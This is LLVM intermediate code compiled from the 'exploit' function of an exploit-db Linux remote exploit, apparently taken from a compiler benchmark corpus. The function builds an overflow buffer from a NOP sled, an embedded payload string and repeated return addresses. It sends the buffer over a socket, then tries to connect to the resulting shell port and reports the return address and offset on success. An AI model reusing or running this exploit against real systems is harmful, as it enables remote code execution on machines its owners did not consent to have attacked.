; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_399.c_exploit.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_399.c_exploit.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_3__ = type { i32 }
%struct.TYPE_4__ = type { i32, i64, i32, i32, i32 }

@MAXPATHLEN = common dso_local global i32 0, align 4
@victim = common dso_local global %struct.TYPE_3__* null, align 8
@rsx = common dso_local global %struct.TYPE_4__ zeroinitializer, align 8
@stderr = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [2 x i8] c";\00", align 1
@.str.1 = private unnamed_addr constant [2 x i8] c"P\00", align 1
@.str.2 = private unnamed_addr constant [2 x i8] c"p\00", align 1
@.str.3 = private unnamed_addr constant [36 x i8] c"\0A\0ASuccess! (ret: %08x offset: %d)\0A\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @exploit(i32 %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i64, align 8
  %6 = alloca [4 x i8], align 1
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  %9 = load i32, i32* @MAXPATHLEN, align 4
  %10 = zext i32 %9 to i64
  %11 = call i8* @llvm.stacksave()
  store i8* %11, i8** %4, align 8
  %12 = alloca i8, i64 %10, align 16
  store i64 %10, i64* %5, align 8
  %13 = load i32, i32* @MAXPATHLEN, align 4
  %14 = sdiv i32 %13, 2
  %15 = load %struct.TYPE_3__*, %struct.TYPE_3__** @victim, align 8
  %16 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %15, i32 0, i32 0
  %17 = load i32, i32* %16, align 4
  %18 = call i32 @strlen(i32 %17)
  %19 = sub nsw i32 %14, %18
  %20 = call i32 @memset(i8* %12, i8 signext -112, i32 %19)
  %21 = load i32, i32* @MAXPATHLEN, align 4
  %22 = sdiv i32 %21, 2
  %23 = load %struct.TYPE_3__*, %struct.TYPE_3__** @victim, align 8
  %24 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %23, i32 0, i32 0
  %25 = load i32, i32* %24, align 4
  %26 = call i32 @strlen(i32 %25)
  %27 = sub nsw i32 %22, %26
  %28 = sext i32 %27 to i64
  %29 = getelementptr inbounds i8, i8* %12, i64 %28
  %30 = load %struct.TYPE_3__*, %struct.TYPE_3__** @victim, align 8
  %31 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %30, i32 0, i32 0
  %32 = load i32, i32* %31, align 4
  %33 = load %struct.TYPE_3__*, %struct.TYPE_3__** @victim, align 8
  %34 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %33, i32 0, i32 0
  %35 = load i32, i32* %34, align 4
  %36 = call i32 @strlen(i32 %35)
  %37 = call i32 @memcpy(i8* %29, i32 %32, i32 %36)
  %38 = load i32, i32* @MAXPATHLEN, align 4
  %39 = sdiv i32 %38, 2
  store i32 %39, i32* %7, align 4
  br label %40

40:                                               ; preds = %51, %1
  %41 = load i32, i32* %7, align 4
  %42 = load i32, i32* @MAXPATHLEN, align 4
  %43 = sdiv i32 %42, 2
  %44 = load i32, i32* getelementptr inbounds (%struct.TYPE_4__, %struct.TYPE_4__* @rsx, i32 0, i32 0), align 8
  %45 = add nsw i32 %43, %44
  %46 = icmp slt i32 %41, %45
  br i1 %46, label %47, label %54

47:                                               ; preds = %40
  %48 = load i32, i32* %7, align 4
  %49 = sext i32 %48 to i64
  %50 = getelementptr inbounds i8, i8* %12, i64 %49
  store i8 120, i8* %50, align 1
  br label %51

51:                                               ; preds = %47
  %52 = load i32, i32* %7, align 4
  %53 = add nsw i32 %52, 1
  store i32 %53, i32* %7, align 4
  br label %40

54:                                               ; preds = %40
  %55 = load i32, i32* @MAXPATHLEN, align 4
  %56 = sdiv i32 %55, 2
  %57 = load i32, i32* getelementptr inbounds (%struct.TYPE_4__, %struct.TYPE_4__* @rsx, i32 0, i32 0), align 8
  %58 = add nsw i32 %56, %57
  store i32 %58, i32* %7, align 4
  br label %59

59:                                               ; preds = %69, %54
  %60 = load i32, i32* %7, align 4
  %61 = load i32, i32* @MAXPATHLEN, align 4
  %62 = icmp slt i32 %60, %61
  br i1 %62, label %63, label %72

63:                                               ; preds = %59
  %64 = load i64, i64* getelementptr inbounds (%struct.TYPE_4__, %struct.TYPE_4__* @rsx, i32 0, i32 1), align 8
  %65 = load i32, i32* %7, align 4
  %66 = sext i32 %65 to i64
  %67 = getelementptr inbounds i8, i8* %12, i64 %66
  %68 = bitcast i8* %67 to i64*
  store i64 %64, i64* %68, align 1
  br label %69

69:                                               ; preds = %63
  %70 = load i32, i32* %7, align 4
  %71 = add nsw i32 %70, 4
  store i32 %71, i32* %7, align 4
  br label %59

72:                                               ; preds = %59
  %73 = load i32, i32* @MAXPATHLEN, align 4
  %74 = sub nsw i32 %73, 1
  %75 = getelementptr inbounds [4 x i8], [4 x i8]* %6, i64 0, i64 0
  %76 = bitcast i8* %75 to i32*
  store i32 %74, i32* %76, align 1
  %77 = load i32, i32* %3, align 4
  %78 = getelementptr inbounds [4 x i8], [4 x i8]* %6, i64 0, i64 0
  %79 = call i64 @write(i32 %77, i8* %78, i32 4)
  %80 = icmp slt i64 %79, 0
  br i1 %80, label %81, label %82

81:                                               ; preds = %72
  store i32 -1, i32* %2, align 4
  store i32 1, i32* %8, align 4
  br label %132

82:                                               ; preds = %72
  %83 = load i32, i32* %3, align 4
  %84 = load i32, i32* @MAXPATHLEN, align 4
  %85 = sub nsw i32 %84, 1
  %86 = call i64 @write(i32 %83, i8* %12, i32 %85)
  %87 = icmp slt i64 %86, 0
  br i1 %87, label %88, label %89

88:                                               ; preds = %82
  store i32 -1, i32* %2, align 4
  store i32 1, i32* %8, align 4
  br label %132

89:                                               ; preds = %82
  %90 = load i32, i32* getelementptr inbounds (%struct.TYPE_4__, %struct.TYPE_4__* @rsx, i32 0, i32 2), align 8
  %91 = getelementptr inbounds [4 x i8], [4 x i8]* %6, i64 0, i64 0
  %92 = bitcast i8* %91 to i32*
  store i32 %90, i32* %92, align 1
  %93 = load i32, i32* %3, align 4
  %94 = getelementptr inbounds [4 x i8], [4 x i8]* %6, i64 0, i64 0
  %95 = call i64 @write(i32 %93, i8* %94, i32 4)
  %96 = icmp slt i64 %95, 0
  br i1 %96, label %97, label %98

97:                                               ; preds = %89
  store i32 -1, i32* %2, align 4
  store i32 1, i32* %8, align 4
  br label %132

98:                                               ; preds = %89
  %99 = getelementptr inbounds [4 x i8], [4 x i8]* %6, i64 0, i64 0
  %100 = call i32 @memset(i8* %99, i8 signext 0, i32 4)
  %101 = load i32, i32* %3, align 4
  %102 = getelementptr inbounds [4 x i8], [4 x i8]* %6, i64 0, i64 0
  %103 = call i64 @write(i32 %101, i8* %102, i32 4)
  %104 = icmp slt i64 %103, 0
  br i1 %104, label %105, label %106

105:                                              ; preds = %98
  store i32 -1, i32* %2, align 4
  store i32 1, i32* %8, align 4
  br label %132

106:                                              ; preds = %98
  %107 = call i32 @usleep(i32 50000)
  %108 = load i32, i32* @stderr, align 4
  %109 = call i32 (i32, i8*, ...) @fprintf(i32 %108, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str, i64 0, i64 0))
  %110 = load i32, i32* getelementptr inbounds (%struct.TYPE_4__, %struct.TYPE_4__* @rsx, i32 0, i32 3), align 4
  %111 = call i32 @open_s(i32 %110, i32 30464)
  store i32 %111, i32* getelementptr inbounds (%struct.TYPE_4__, %struct.TYPE_4__* @rsx, i32 0, i32 4), align 8
  %112 = icmp slt i32 %111, 0
  br i1 %112, label %113, label %126

113:                                              ; preds = %106
  %114 = call i32 (...) @rand()
  %115 = srem i32 %114, 2
  %116 = icmp ne i32 %115, 0
  br i1 %116, label %117, label %120

117:                                              ; preds = %113
  %118 = load i32, i32* @stderr, align 4
  %119 = call i32 (i32, i8*, ...) @fprintf(i32 %118, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.1, i64 0, i64 0))
  br label %123

120:                                              ; preds = %113
  %121 = load i32, i32* @stderr, align 4
  %122 = call i32 (i32, i8*, ...) @fprintf(i32 %121, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2, i64 0, i64 0))
  br label %123

123:                                              ; preds = %120, %117
  %124 = load i32, i32* %3, align 4
  %125 = call i32 @quit(i32 %124)
  store i32 -1, i32* %2, align 4
  store i32 1, i32* %8, align 4
  br label %132

126:                                              ; preds = %106
  %127 = load i32, i32* @stderr, align 4
  %128 = load i64, i64* getelementptr inbounds (%struct.TYPE_4__, %struct.TYPE_4__* @rsx, i32 0, i32 1), align 8
  %129 = trunc i64 %128 to i32
  %130 = load i32, i32* getelementptr inbounds (%struct.TYPE_4__, %struct.TYPE_4__* @rsx, i32 0, i32 2), align 8
  %131 = call i32 (i32, i8*, ...) @fprintf(i32 %127, i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.3, i64 0, i64 0), i32 %129, i32 %130)
  store i32 1, i32* %2, align 4
  store i32 1, i32* %8, align 4
  br label %132

132:                                              ; preds = %126, %123, %105, %97, %88, %81
  %133 = load i8*, i8** %4, align 8
  call void @llvm.stackrestore(i8* %133)
  %134 = load i32, i32* %2, align 4
  ret i32 %134
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local i32 @memset(i8*, i8 signext, i32) #2

declare dso_local i32 @strlen(i32) #2

declare dso_local i32 @memcpy(i8*, i32, i32) #2

declare dso_local i64 @write(i32, i8*, i32) #2

declare dso_local i32 @usleep(i32) #2

declare dso_local i32 @fprintf(i32, i8*, ...) #2

declare dso_local i32 @open_s(i32, i32) #2

declare dso_local i32 @rand(...) #2

declare dso_local i32 @quit(i32) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
